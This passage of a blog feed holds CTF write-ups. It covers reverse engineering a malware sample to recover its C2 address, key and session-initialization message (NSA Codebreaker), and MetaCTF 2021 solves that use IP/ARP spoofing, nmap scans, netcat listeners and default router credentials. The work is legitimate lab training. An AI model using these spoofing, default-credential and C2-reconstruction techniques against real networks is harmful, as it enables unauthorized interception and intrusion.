&lt;p>To find the ip -&amp;gt; there is a variable called &amp;ldquo;ip_00&amp;rdquo; and opening up GDB GEF, you can run &lt;code>rzlsqwdcbkzvl(13)&lt;/code> and get the ip as &lt;code>198.51.100.84&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>To find the version number: go into other weird function -&amp;gt; &lt;code>ospoimcwliqai&lt;/code> and see the &amp;ldquo;version_00&amp;rdquo; variable = &lt;code>0.0.0.4-MOB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>To find the key (the hardest): &lt;code>call rzlsqwdcbkzvl(12)&lt;/code>. We used 0x12 because I manually enumerated calling this deobfuscation function (after I noticed ip_00 and version_00). &amp;ldquo;0x12&amp;rdquo; converts to 18 in decimal (&lt;a href="https://bluesock.org/~willg/dev/ascii.html">ascii table reference&lt;/a>).&lt;/p>
&lt;ul>
&lt;li>However, when you call that function, it gives you some weird gibberish:&lt;/li>
&lt;/ul>
&lt;p>&lt;code>$2 = 5555555f7d34 &amp;quot;\002f\255\063O\307Ǟv\274\064\345痾\232Rm\031\302\222\065IT\001O\034\071\347\367C3&amp;quot;&lt;/code>&lt;/p>
&lt;p>So, you have to use the GDB x command and run &lt;code>x/32xb $2&lt;/code> and then manually copy and paste each hex into a line for the submission.&lt;/p>
&lt;p>Final submission:&lt;/p>
&lt;p>&lt;code>0266ad334fc7c79e76bc34e5e97be9a526d19c292354954014f1c39e7f7433&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Reference: &lt;a href="https://visualgdb.com/gdbreference/commands/x">GDB x commad&lt;/a>&lt;/p>
&lt;h2 id="alternative-solution-process" >Alternative Solution Process
&lt;span>
&lt;a href="#alternative-solution-process">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Notice that this one funtion &lt;code>rzlsqwdcbkzvl&lt;/code> takes in some int and Ghidra allows you to call functions and as you add in numbers, you find the information you want.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/codebreaker/beginningPart.png" alt="beginning of calling function">&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/codebreaker/solve.png" alt="finding the relavent information for this challenge">&lt;/p>
&lt;h1 id="task-7---solo" >Task 7 - SOLO
&lt;span>
&lt;a href="#task-7---solo">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>With the information provided, PANIC worked with OOPS to revert their Docker image to a build prior to the compromise. Both companies are implementing additional checks to prevent a similar attack in the future.&lt;/p>
&lt;p>Meanwhile, NSA&amp;rsquo;s Cybersecurity Collaboration Center is working with DC3 to put together a Cybersecurity Advisory (CSA) for the rest of the DIB. DC3 has requested additional details about the techniques, tools, and targets of the cyber actor.&lt;/p>
&lt;p>To get a better understanding of the techniques being used, we need to be able to connect to the listening post. Using the knowledge and material from previous tasks, analyze the protocol clients use to communicate with the LP. Our analysts believe the protocol includes an initial crypt negotiation followed by a series of client-generated requests, which the LP responds to. Provide the plaintext a client would send to initialize a new session with the provided UUID.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Victim ID to use in initialization message (victim_id)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-6" >Solution
&lt;span>
&lt;a href="#solution-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Gotta allocate memory for the string.&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ call (string *) malloc(sizeof(std::string))
$3 = (std::string *) 0x555555da4e10
gef➤ call ((std::string*)0x555555da4e10)-&amp;gt;basic_string()
gef➤ call ((std::string*)0x555555da4e10)-&amp;gt;assign
(&amp;quot;4da468db-1daa-481c-9be7-d9feee42a436&amp;quot;)
$4 = (std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;amp;) @0x555555da4e10: {
static npos = 0xffffffffffffffff,
_M_dataplus = {
&amp;lt;std::allocator&amp;lt;char&amp;gt;&amp;gt; = {
&amp;lt;__gnu_cxx::new_allocator&amp;lt;char&amp;gt;&amp;gt; = {&amp;lt;No data fields&amp;gt;}, &amp;lt;No data fields&amp;gt;},
members of std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;::_Alloc_hider:
_M_p = 0x555555da4e70 &amp;quot;4da468db-1daa-481c-9be7-d9feee42a436&amp;quot;
},
_M_string_length = 0x24,
{
_M_local_buf = &amp;quot;$&amp;quot;, '\000' &amp;lt;repeats 14 times&amp;gt;,
_M_allocated_capacity = 0x24
}
}
&lt;/code>&lt;/pre>&lt;p>Now we can call the function that allocates it with the UUID&amp;hellip;&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ call elcftaqudeovx(*(const std::string*)0x555555da4e10,0x10)
$9 = {
static npos = 0xffffffffffffffff,
_M_dataplus = {
&amp;lt;std::allocator&amp;lt;char&amp;gt;&amp;gt; = {
&amp;lt;__gnu_cxx::new_allocator&amp;lt;char&amp;gt;&amp;gt; = {&amp;lt;No data fields&amp;gt;}, &amp;lt;No data fields&amp;gt;},
members of std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;::_Alloc_hider:
_M_p = 0x7fffffffddf0 &amp;quot;&amp;quot;
},
_M_string_length = 0x0,
{
_M_local_buf = '\000' &amp;lt;repeats 15 times&amp;gt;,
_M_allocated_capacity = 0x0
}
}
&lt;/code>&lt;/pre>&lt;p>BUT alas, that function actually just overwrites it so fuck that. So we must just rewrite where that _M_p pointer is and put the memory address of the UUID -&amp;gt; &lt;code>set *$9._M_dataplus._M_p = 0x555555da4e10&lt;/code>&lt;/p>
&lt;p>Where does the UUID get used other than the above (elcftaqudeovx)?&lt;/p>
&lt;p>&lt;code>string * coxclamjiqjlw(string *__return_storage_ptr__,string *uuid)&lt;/code>&lt;/p>
&lt;p>Before we can call that function, it takes in a &lt;code>__return_storage_ptr__&lt;/code>. Then can do that&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ call (string *) malloc(sizeof(std::string))
$10 = (std::string *) 0x555555da4db0
&lt;/code>&lt;/pre>&lt;p>Calling the function was not fucking working, so I gotta edit the register and fuck with it.&lt;/p>
&lt;p>&lt;code>set $rbp-0x1a8 = 0x555555da4db0&lt;/code>&lt;/p>
&lt;p>NOW, we can call the function again and hopefully get the freaking answer.&lt;/p>
&lt;p>&lt;code>call (std::string *) (*0x5555555b2545(*0x555555da4db0,*0x555555da4e10))&lt;/code>&lt;/p>
&lt;p>Yeah so all that did not work so I instead did it statically.&lt;/p>
&lt;h2 id="static-solve" >Static Solve
&lt;span>
&lt;a href="#static-solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Look at what everything is set to in ghidra within that function.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/codebreaker/thefunction.png" alt="function of interest">&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/codebreaker/ghidraVars.png" alt="ghidra stuff">&lt;/p>
&lt;p>Alternatively, you can click on the function that is taking in that variable and see what the size is (like &lt;code>pnsikqtljaxba(&amp;amp;cmd_param,PARAM_CMD)&lt;/code>). You have to note down the size in order to correctly convert it to bytes and then back to a hex string/dump. We have to convert to bytes because that is what the program is doing to then send it to start the connection. We noticed this back when we saw how the UUID gets constructed. In the picture below, we see randombytes() so that tells us that there is a conversion of bytes.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/codebreaker/assigningUUID.png" alt="assigning uuid">&lt;/p>
&lt;p>The parts that are sent are now defined below with the correct byte sizes.&lt;/p>
&lt;pre tabindex="0">&lt;code>magic_start: 1553DC11
cmd_param: 1700
cmd_length: 0002
cmd_data: 0002
uuid_param: 1708
uuid_length: 0010
uuid: b'M\xa4h\xdb\x1d\xaaH\x1c\x9b\xe7\xd9\xfe\xeeB\xa46'
magic_end: E38A5B8C
&lt;/code>&lt;/pre>&lt;p>Then convert that to hex (in the convert.py script) and we get the hex dump :).&lt;/p>
&lt;p>&lt;code>1553dc11170000020002170800104da468db1daa481c9be7d9feee42a436e38a5b8c&lt;/code>&lt;/p></description></item><item><title>MetaCTF 2021</title><link>https://murphe22.com/posts/metactf/</link><pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/metactf/</guid><description>&lt;p>Starting Friday, December 3rd, 2021, MetaCTF will host it&amp;rsquo;s 7th annual virtual jeopardy-style CTF! This event is free and open to everyone, and participants can compete in teams of up to 4.&lt;/p>
&lt;p>This CTF will challenge participants of all skill levels to learn new cybersecurity techniques and skills, with problems covering a variety of topics such as web exploitation, cryptography, binary exploitation, reverse engineering, forensics, and reconnaissance.&lt;/p>
&lt;h1 id="intro" >Intro
&lt;span>
&lt;a href="#intro">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>This CTF was the first time our club has participated and it was an absolute blast. Thank you to my awesome team members (Rohan, Lane, and Bode)!!! We placed 58th overall and 25th amongst student teams!&lt;/p>
&lt;h1 id="darryl-vault" >Darryl Vault
&lt;span>
&lt;a href="#darryl-vault">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Dread Pirate Darryl has no qualms with a little bit - or a lot - of thievery, as you recently found out to your detriment. Suffice it to say his loot stash has grown quite a bit, and you find yourself down a whole bunch of valuables. This is, put simply, unacceptable. You need to rectify this situation, and returning the favor ought to do the trick.&lt;/p>
&lt;p>As a Dread Pirate, Dread Pirate Darryl has much better things to do than remembering all of his secrets, such as raiding other innocent CTF-goers or shouting &amp;ldquo;ARRRRR&amp;rdquo; at the top of his lungs repeatedly. Darryl commissioned a secret vault program to be written for him so that when he needs to take newly acquired loot back to his lair, he can ask it where he has to go.&lt;/p>
&lt;p>Unfortunately for Dread Pirate Darryl, the developer from whom he commissioned the vault was very proud of his work and wanted to show it off, and we here at MetaCTF have acquired a copy of it. Find Dread Pirate Darryl&amp;rsquo;s treasures! Enact your revenge!&lt;/p>
&lt;p>Note: The flag is the password used to access the location of Dread Pirate Darryl&amp;rsquo;s treasure.&lt;/p>
&lt;h2 id="solve" >Solve
&lt;span>
&lt;a href="#solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>First, i just ran the file to see what was going on and saw that there were four different options.
I went to ghidra, looked at the entry, got the first argument of libc start main and renamed main
Rebase Ghidra
Break main and look at what it’s doing
We have four possible inputs, right?
1, 2 3, 4&lt;/p>
&lt;p>Mother’s maiden name does not prompt for a password&lt;/p>
&lt;p>The password for 2&amp;amp;3 is just chilling in strings DARRYL_IS_THE_GREATEST&lt;/p>
&lt;p>4 asks for a password, but it doesnt output anything else. Hmmmmmmmmmmmm 👀&lt;/p>
&lt;p>Essentially, the password is checked on three separate occasions
We return to ghidra. Defined strings go burrrrr. “Hey, Darryl, I&amp;rsquo;m going to need your password” has three functions nearby it. Three???? hmmmmmmmmmmmmmmm&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/message.png" alt="idek">&lt;/p>
&lt;p>Why dont we click on those functions 👀&lt;/p>
&lt;p>Oh cool that last one looks sexy&lt;/p>
&lt;p>This is where i found the function i named funcwithtoomanynums. U will know it when u see it&lt;/p>
&lt;p>Inside that, the memcmp 0x27 goooo burrrrrr&lt;/p>
&lt;p>Let’s just fuck around in gdb and break at this memcmp with ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’ bc its len is 0x27&lt;/p>
&lt;p>Gdb go burrrrrr
ty gdb v cool&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/flag.png" alt="flag in memory">&lt;/p>
&lt;h1 id="easy-as-it-is" >Easy as it is
&lt;span>
&lt;a href="#easy-as-it-is">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the packet capture right before the flag was supposed to be revealed. Can you still find the flag? Note: You&amp;rsquo;ll need to decrypt in CyberChef rather than using a command line utility.&lt;/p>
&lt;h2 id="solve-1" >Solve
&lt;span>
&lt;a href="#solve-1">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Get the PGP message and private key from the pcap. Put it in CyberChef and notice it is still messed up. So, mess around with the decrompression and find that &lt;code>gzip&lt;/code> works.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/cyberChef.png" alt="cyberchef">&lt;/p>
&lt;p>&lt;code>MetaCTF{cleartext_private_pgp_keys}&lt;/code>&lt;/p>
&lt;h1 id="i-hate-python" >I Hate Python
&lt;span>
&lt;a href="#i-hate-python">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I hate Python, and now you will too. Find the password.&lt;/p>
&lt;h2 id="solve-2" >Solve
&lt;span>
&lt;a href="#solve-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Scripting fun:&lt;/p>
&lt;pre tabindex="0">&lt;code>import random
def do_thing(a, b):
return ((a &amp;lt;&amp;lt; 1) &amp;amp; b) ^ ((a &amp;lt;&amp;lt; 1) | b)
def checkFlag(x, prevLen):
random.seed(997)
k = [random.randint(0, 256) for _ in range(len(x))]
a = { b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k) }
b = list(range(len(x)))
random.shuffle(b)
c = [a[i] for i in b[::-1]]
# print(k)
# print(c)
kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]
valid = len(list(filter(lambda s: kn[s[0]] == s[1], enumerate(c))))
# print(valid)
if valid &amp;gt; prevLen:
return True
return False
#random.seed(997)
k = [random.randint(0, 256) for _ in range(25)]
# print(k)
#x = &amp;quot;A&amp;quot;*25
# a = {b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k)}
#kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]
# write a loop to go through all the possible ascii
# values and do_thing it with all values in k
currFlag = 'MetaCTF{'
for i in range(25 - 8):
for j in range(0, 128):
nextFlag = currFlag + chr(j) + 'A'*(16-i)
# print(&amp;quot;test&amp;quot;)
print(nextFlag)
assert(len(nextFlag) == 25)
if checkFlag(nextFlag, len(currFlag)):
# print(nextFlag)
currFlag = currFlag + chr(j)
break
# print(currFlag)
&lt;/code>&lt;/pre>&lt;p>&lt;code>MetaCTF{yOu_w!N_th1$_0n3}&lt;/code>&lt;/p>
&lt;h1 id="interception-i" >Interception I
&lt;span>
&lt;a href="#interception-i">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.
ssh &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;p>If you get an SSH host key error, consider using
ssh -o &amp;ldquo;UserKnownHostsFile=/dev/null&amp;rdquo; -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;p>Note that the connection can take a while to initialize. It will say Granting console connection to device&amp;hellip; and then three dots will appear. After the third dot you should have a connection.&lt;/p>
&lt;h2 id="solve-note-i-did-this-at-2-am" >Solve (Note I did this at 2 AM)
&lt;span>
&lt;a href="#solve-note-i-did-this-at-2-am">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Gotta do some ip spoofing.&lt;/p>
&lt;ol>
&lt;li>first changed ip address to spoofy&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ifconfig eth0 192.168.0.2 netmask 255.255.255.0&lt;/code>&lt;/p>
&lt;ol start="2">
&lt;li>then do a lil ping to test connection and refresh arp cache so we changed the ip address&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ping 192.168.0.1&lt;/code>&lt;/p>
&lt;ol start="3">
&lt;li>then do a lil nmap mappy&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nmap -sn -PU 192.168.0.0/24&lt;/code>&lt;/p>
&lt;ol start="4">
&lt;li>then do a lil net catty cat&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nc -lu 192.168.0.2 8000&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{addr3s5_r3s0lut1on_pwn4g3}&lt;/code>&lt;/p>
&lt;h1 id="interception-ii" >Interception II
&lt;span>
&lt;a href="#interception-ii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Someone on this network is periodically sending the flag to &amp;hellip; someone else on this network, over TCP port 8000. Go get it.
ssh &lt;a href="mailto:ctf-46ed3559da08@host.cg21.metaproblems.com">ctf-46ed3559da08@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
&lt;h2 id="solve-3" >Solve
&lt;span>
&lt;a href="#solve-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Similar process to Interception I.&lt;/p>
&lt;ol>
&lt;li>There are more hosts up, so let&amp;rsquo;s see what is open.&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nmap -p 8000 192.168.0.0/24 -v | grep open&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>Discovered open port 8000/tcp on 192.168.0.78
8000/tcp open http-alt
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>Ping to test connection.&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ping 192.168.0.78&lt;/code>&lt;/p>
&lt;ol start="3">
&lt;li>Check interface that we gotta change&lt;/li>
&lt;/ol>
&lt;p>&lt;code>arp -a&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>ip-192-168-0-78.ec2.internal (192.168.0.78) at 02:42:0a:00:a3:c3 [ether] on eth0
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>Change the ip&lt;/li>
&lt;/ol>
&lt;p>&lt;code>ifconfig eth0 192.168.0.78 netmask 255.255.255.0&lt;/code>&lt;/p>
&lt;ol start="5">
&lt;li>
&lt;p>&lt;code>ping 192.168.0.78&lt;/code> to refresh the arp cache so it does the spoofy&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Setup the netcat connection&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;code>nc -lvp 8000&lt;/code>&lt;/p>
&lt;p>&lt;code>MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}&lt;/code>&lt;/p>
&lt;h1 id="interception-iii" >Interception III
&lt;span>
&lt;a href="#interception-iii">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>192.168.55.3 is periodically sending the flag to 172.16.0.2 over UDP port 8000. Go get it.
By the way, I&amp;rsquo;ve been told the admins at this organization use really shoddy passwords.
ssh &lt;a href="mailto:ctf-f36ef72cadc1@host.cg21.metaproblems.com">ctf-f36ef72cadc1@host.cg21.metaproblems.com&lt;/a> -p 7000
Note: The password for this user is the flag from Interception I. You must finish Interception I before starting this challenge.&lt;/p>
&lt;h2 id="solve-4" >Solve
&lt;span>
&lt;a href="#solve-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>First enumerate&amp;hellip;. &lt;code>nmap -v 192.168.0.0/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/I3scan.png" alt="nmap scan">&lt;/p>
&lt;p>So&amp;hellip; telnet means we can connect to smtn&amp;hellip; we know it is a router bc usually default gateways have an end address of &amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&lt;strong>1&lt;/strong>&lt;/p>
&lt;p>Gotta identify the router&lt;/p>
&lt;p>&lt;code>nmap -O 192.168.0.1&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 08:57 UTC
Nmap scan report for ip-192-168-0-1.ec2.internal (192.168.0.1)
Host is up (0.000077s latency).
Not shown: 999 closed tcp ports (reset)
PORT STATE SERVICE
23/tcp open telnet
MAC Address: 02:42:0A:00:0F:42 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
&lt;/code>&lt;/pre>&lt;p>Important: &lt;strong>Linux 4.15-5.6&lt;/strong>&lt;/p>
&lt;p>google search: routers that use Linux 4.15 - 5.6 -&amp;gt; TP-Link&lt;/p>
&lt;p>Find root login -&amp;gt; &lt;a href="https://www.cleancss.com/router-default/TP-Link">TP Link Default Creds&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>username: root
password: admin
&lt;/code>&lt;/pre>&lt;p>When you get access, and do an &lt;code>ls&lt;/code>, find bird-2.0.8 -&amp;gt;
&lt;a href="https://blog.kintone.io/entry/bird">https://blog.kintone.io/entry/bird&lt;/a> and &lt;a href="https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html">https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html&lt;/a>&lt;/p>
